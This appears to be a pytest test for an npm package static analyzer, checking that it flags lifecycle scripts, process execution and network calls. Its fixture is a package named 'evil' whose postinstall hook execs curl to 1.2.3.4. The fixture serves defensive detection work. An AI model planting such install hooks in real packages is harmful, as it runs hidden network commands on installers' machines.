import json
from pathlib import Path
from npm_ide_analyst.static.engine import run_static


def test_run_static_combines_analyzers(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "evil", "scripts": {"postinstall": "node ./s.js"}}))
    (tmp_path / "s.js").write_text(
        "const cp=require('child_process');cp.exec('curl http://1.2.3.4/x');",
        encoding="utf-8")
    findings = run_static(tmp_path)
    cats = {f.category for f in findings}
    assert "lifecycle-script" in cats
    assert "process-exec" in cats
    assert "network" in cats
    # ids are unique
    ids = [f.id for f in findings]
    assert len(ids) == len(set(ids))
